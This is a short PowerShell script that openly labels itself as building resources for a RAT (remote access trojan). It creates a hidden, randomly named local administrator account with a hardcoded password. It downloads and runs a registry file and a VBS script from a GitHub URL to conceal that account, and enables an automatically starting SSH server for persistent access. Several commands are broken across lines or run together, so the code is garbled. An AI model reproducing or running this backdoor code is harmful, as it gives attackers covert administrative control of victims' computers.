# builds resources for rat
# created by : jfrdgh (@bigmanlc on dc)

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
}


# create local admin for rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname"
        -pword $pword -FullName
        "$uname" -Description
        "Temporary Local Admin"
        Write-Verbose
        "$uname local user created"
        Add-LocalGroupMember
        -Group "Administrators"
        -Member "$uname"
    }
    end { 
    }
}

# create admin user
$uname = random_text
$pword = (ConvertTo-SecureString "QuentionABC123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

# registry to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/admin.reg -OutFile "$reg_file.reg"

# visual basic script to register the registry
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/confirm.vbs -OutFile "$vbs_file.vbs"

# install the registry
./"$reg_file.reg";"$vbs_file.vbs"

# goto temp
$wd = random_text
$path = "$env:TEMP/$wd"
$initial_dir = Get-Location
$pocpath = "$env:TEMP/poc"

# enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh*

# make working directory
cd $path
mkdir $path

# cd $initial_dir
# del installer.ps1
